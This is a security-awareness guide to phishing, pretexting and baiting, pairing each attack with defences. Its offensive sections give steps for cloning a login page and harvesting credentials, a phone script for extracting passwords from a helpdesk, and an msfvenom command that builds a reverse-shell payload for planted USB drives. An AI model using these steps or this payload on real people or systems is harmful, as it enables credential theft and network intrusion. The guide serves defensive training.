# Social Engineering Attacks: Phishing, Pretexting, Baiting

This guide covers **phishing**, **pretexting**, and **baiting** social engineering attacks with detailed practical scenarios, offensive techniques, defensive measures, and hands-on examples.

---

## 1. Phishing Attack

### Practical Scenario:
An **HR Manager** in a medium-sized company receives an email that appears to be from the company's CEO, instructing them to log in to a "new employee benefits portal" to verify payroll information.

---

### Offensive Perspective (How to Attack)

1. **Reconnaissance**:
   - Use tools like **LinkedIn**, **company websites**, or **theHarvester** to gather basic information about employees, particularly the HR Manager.
   
2. **Create a Phishing Page**:
   - Clone a legitimate login page using tools like **SET (Social Engineering Toolkit)** or **HTTrack**. 
   - Example: Clone the company’s benefits portal.

3. **Craft the Phishing Email**:
   - Use **Gophish** to create an email that looks like it’s from the CEO (`ceo@company.com`).
   - Example message:  
     > "Please log in to the new Employee Benefits Portal to review payroll changes. Your immediate action is required. [Click here to log in]."

4. **Set Up the Backend**:
   - Use **Ngrok** or a web server to host the cloned page and set up a backend script (PHP) to capture credentials when entered.

5. **Deploy the Attack**:
   - Send the phishing email to the HR Manager, ensuring the link points to your cloned site.

6. **Monitor the Captured Credentials**:
   - Once the victim enters their credentials, capture them on the backend and use them for further access.

### Defensive Perspective (How to Protect Against Phishing)

1. **Security Awareness Training**:
   - Teach employees to check sender addresses, hover over links, and report suspicious emails.
   
2. **Email Filtering Tools**:
   - Implement **DMARC, SPF, and DKIM** to prevent email spoofing. Use **Proofpoint** to filter suspicious emails.

3. **Enable MFA**:
   - Require multi-factor authentication so even if credentials are compromised, unauthorized access is prevented.

4. **Phishing Simulations**:
   - Conduct regular phishing simulations using **Gophish** to train employees.

---

## 2. Pretexting Attack

### Practical Scenario:
An attacker, posing as an **IT technician**, calls a company’s Helpdesk and claims they need login credentials for a critical system update. The Helpdesk agent unknowingly provides the information.

---

### Offensive Perspective (How to Attack)

1. **Create a Pretext**:
   - Pose as an internal **IT support** technician and prepare a credible backstory.
   - Example script:  
     > "This is John from IT. We’re performing urgent updates and need your credentials to verify access."

2. **Build Trust and Urgency**:
   - Manipulate the target into providing information by creating urgency.
   - Example: "If we don’t resolve this now, accounts will be locked."

3. **Request Sensitive Information**:
   - Extract credentials, passwords, or other sensitive details.

4. **Exploit the Information**:
   - Use the captured credentials to log in to internal systems and access valuable resources.

---

### Defensive Perspective (How to Protect Against Pretexting)

1. **Verification Protocols**:
   - Implement strict verification policies requiring confirmation before sharing sensitive data.

2. **Limit Information Access**:
   - Ensure only authorized personnel have access to sensitive data.

3. **Security Awareness Training**:
   - Train Helpdesk and employees to recognize pretexting and challenge unverified callers.

4. **Caller ID Verification**:
   - Use caller ID verification services to authenticate calls before disclosing any sensitive information.

## 3. Baiting Attack

### Practical Scenario:
An attacker leaves USB drives labeled **"Executive Salary Reports"** in the company parking lot. Curious employees plug them into their work computers, and malware on the drives provides the attacker with remote access.

---

### Offensive Perspective (How to Attack)

1. **Prepare the USB Drive**:
   - Use **Metasploit** to load malware (e.g., a reverse shell) onto USB drives.
   - Command Example:  
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=4444 -f exe > payload.exe
     ```

2. **Create an Enticing Label**:
   - Label the USB drives with something that encourages curiosity, like:  
     > "Executive Salary Reports Q3 2024"

3. **Deploy the Bait**:
   - Leave USB drives in the company’s parking lot, break room, or other common areas.

4. **Wait for Victims**:
   - Once an employee plugs the USB into their computer, the malware automatically runs and establishes a reverse shell.

5. **Exploit Access**:
   - Use the remote access to navigate the company’s internal network and steal sensitive data.

---

### Defensive Perspective (How to Protect Against Baiting)

1. **Disable Auto-Run**:
   - Disable the auto-run feature for USB drives on all company systems.

2. **Security Awareness Training**:
   - Educate employees not to plug in unknown USB devices.

3. **Endpoint Security**:
   - Use tools like **Symantec Endpoint Protection** to block unauthorized devices and the execution of malicious files.

4. **Monitor Network Traffic**:
   - Implement **SIEM** tools like **Splunk** to detect unusual network behavior, such as the initiation of remote connections.

---

### Hands-On Example: Baiting

1. **Step 1**: Use **Metasploit** to load a reverse shell onto a USB drive.
2. **Step 2**: Label the USB drive as “Executive Salary Data.”
3. **Step 3**: Leave the USB in a high-traffic area (e.g., parking lot).
4. **Step 4**: Wait for a victim to plug in the USB and monitor the reverse shell connection.
5. **Step 5**: Defensive countermeasures include disabling auto-run and using endpoint security to block malware execution.

## Conclusion

These social engineering attacks—**phishing**, **pretexting**, and **baiting**—demonstrate how attackers exploit human vulnerabilities. By learning offensive techniques and defensive measures, companies can better protect themselves and educate employees on recognizing and preventing these attacks.
